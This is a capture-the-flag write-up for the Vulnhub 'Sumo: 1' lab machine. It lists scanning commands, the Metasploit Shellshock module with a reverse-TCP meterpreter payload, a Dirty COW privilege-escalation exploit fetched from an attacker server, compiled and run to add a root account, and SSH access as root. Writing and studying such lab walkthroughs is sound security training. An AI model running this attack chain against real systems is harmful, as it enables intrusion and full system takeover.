# Sumo-1: Vulnhub Writeup
It is an boot2root challenge of the Vulnhub machine “Sumo: 1”. An intermediate box based on the Linux machine.

Machine Name: Sumo_Sun*
- Author: SunCSR Team
- Difficulty: Beginner
- Tested: VMware Workstation 15.x Pro
- DHCP: Enabled
- Goal: Get the root shell i.e.(root@localhost:~#) and then obtain flag under /root).

## SCANNING

Scanning port using nmap 

**nmap target-ip**

![Sumo%201%20Vulnhub%20Writeup%2006c3ecf6e7354c8694a7e1014ff86f4b/Untitled.png](Sumo%201%20Vulnhub%20Writeup%2006c3ecf6e7354c8694a7e1014ff86f4b/Untitled.png)

Service version and aggressive scan

**nmap -sV -A target-ip**

![Sumo%201%20Vulnhub%20Writeup%2006c3ecf6e7354c8694a7e1014ff86f4b/Untitled%201.png](Sumo%201%20Vulnhub%20Writeup%2006c3ecf6e7354c8694a7e1014ff86f4b/Untitled%201.png)

## Enumeration

Lets open target-ip in web browser

![Sumo%201%20Vulnhub%20Writeup%2006c3ecf6e7354c8694a7e1014ff86f4b/Untitled%202.png](Sumo%201%20Vulnhub%20Writeup%2006c3ecf6e7354c8694a7e1014ff86f4b/Untitled%202.png)

Running  nikto on target-ip

**nikto -h target-ip**

![Sumo%201%20Vulnhub%20Writeup%2006c3ecf6e7354c8694a7e1014ff86f4b/Untitled%203.png](Sumo%201%20Vulnhub%20Writeup%2006c3ecf6e7354c8694a7e1014ff86f4b/Untitled%203.png)

Nikto found that application is vulnerable to shellshock.

![Sumo%201%20Vulnhub%20Writeup%2006c3ecf6e7354c8694a7e1014ff86f4b/Untitled%204.png](Sumo%201%20Vulnhub%20Writeup%2006c3ecf6e7354c8694a7e1014ff86f4b/Untitled%204.png)

## Exploitation

After some research i found shellshock exploit in metasploit.

open msfconsole and search shellshock

**use exploit/multi/http/apache_mod_cgi_bash_env_exec** 

![Sumo%201%20Vulnhub%20Writeup%2006c3ecf6e7354c8694a7e1014ff86f4b/Untitled%205.png](Sumo%201%20Vulnhub%20Writeup%2006c3ecf6e7354c8694a7e1014ff86f4b/Untitled%205.png)

**set payload Linux/x86/meterpreter/reverse_tcp**

![Sumo%201%20Vulnhub%20Writeup%2006c3ecf6e7354c8694a7e1014ff86f4b/Untitled%206.png](Sumo%201%20Vulnhub%20Writeup%2006c3ecf6e7354c8694a7e1014ff86f4b/Untitled%206.png)

**set rhosts target-ip**

**set targeturi /cgi-bin/test**

![Sumo%201%20Vulnhub%20Writeup%2006c3ecf6e7354c8694a7e1014ff86f4b/Untitled%207.png](Sumo%201%20Vulnhub%20Writeup%2006c3ecf6e7354c8694a7e1014ff86f4b/Untitled%207.png)

**exploit**

![Sumo%201%20Vulnhub%20Writeup%2006c3ecf6e7354c8694a7e1014ff86f4b/Untitled%208.png](Sumo%201%20Vulnhub%20Writeup%2006c3ecf6e7354c8694a7e1014ff86f4b/Untitled%208.png)

We got meterpreter shell of target system.

![Sumo%201%20Vulnhub%20Writeup%2006c3ecf6e7354c8694a7e1014ff86f4b/Untitled%209.png](Sumo%201%20Vulnhub%20Writeup%2006c3ecf6e7354c8694a7e1014ff86f4b/Untitled%209.png)

## Privilege escalation

Download dirtycow script from attacker server

![Sumo%201%20Vulnhub%20Writeup%2006c3ecf6e7354c8694a7e1014ff86f4b/Untitled%2010.png](Sumo%201%20Vulnhub%20Writeup%2006c3ecf6e7354c8694a7e1014ff86f4b/Untitled%2010.png)

![Sumo%201%20Vulnhub%20Writeup%2006c3ecf6e7354c8694a7e1014ff86f4b/Untitled%2011.png](Sumo%201%20Vulnhub%20Writeup%2006c3ecf6e7354c8694a7e1014ff86f4b/Untitled%2011.png)

compile script using command    **gcc -pthread -o exp exploit.c -lcrypt**

![Sumo%201%20Vulnhub%20Writeup%2006c3ecf6e7354c8694a7e1014ff86f4b/Untitled%2012.png](Sumo%201%20Vulnhub%20Writeup%2006c3ecf6e7354c8694a7e1014ff86f4b/Untitled%2012.png)

give execute permission to exp

**chmod 777 exp**

![Sumo%201%20Vulnhub%20Writeup%2006c3ecf6e7354c8694a7e1014ff86f4b/Untitled%2013.png](Sumo%201%20Vulnhub%20Writeup%2006c3ecf6e7354c8694a7e1014ff86f4b/Untitled%2013.png)

run script using command   (This script will pwn root user as firefart)

**./exp 0    (here 0 is password)**

![Sumo%201%20Vulnhub%20Writeup%2006c3ecf6e7354c8694a7e1014ff86f4b/Untitled%2014.png](Sumo%201%20Vulnhub%20Writeup%2006c3ecf6e7354c8694a7e1014ff86f4b/Untitled%2014.png)

Lets connect through ssh

**ssh firefart@target-ip**

![Sumo%201%20Vulnhub%20Writeup%2006c3ecf6e7354c8694a7e1014ff86f4b/Untitled%2015.png](Sumo%201%20Vulnhub%20Writeup%2006c3ecf6e7354c8694a7e1014ff86f4b/Untitled%2015.png)

open /etc/passwd

![Sumo%201%20Vulnhub%20Writeup%2006c3ecf6e7354c8694a7e1014ff86f4b/Untitled%2016.png](Sumo%201%20Vulnhub%20Writeup%2006c3ecf6e7354c8694a7e1014ff86f4b/Untitled%2016.png)

change firefart to root

![Sumo%201%20Vulnhub%20Writeup%2006c3ecf6e7354c8694a7e1014ff86f4b/Untitled%2017.png](Sumo%201%20Vulnhub%20Writeup%2006c3ecf6e7354c8694a7e1014ff86f4b/Untitled%2017.png)

Then again connect with ssh as root user now

**ssh root@192.168.122.137**

![Sumo%201%20Vulnhub%20Writeup%2006c3ecf6e7354c8694a7e1014ff86f4b/Untitled%2018.png](Sumo%201%20Vulnhub%20Writeup%2006c3ecf6e7354c8694a7e1014ff86f4b/Untitled%2018.png)

Got root flag in root.txt file
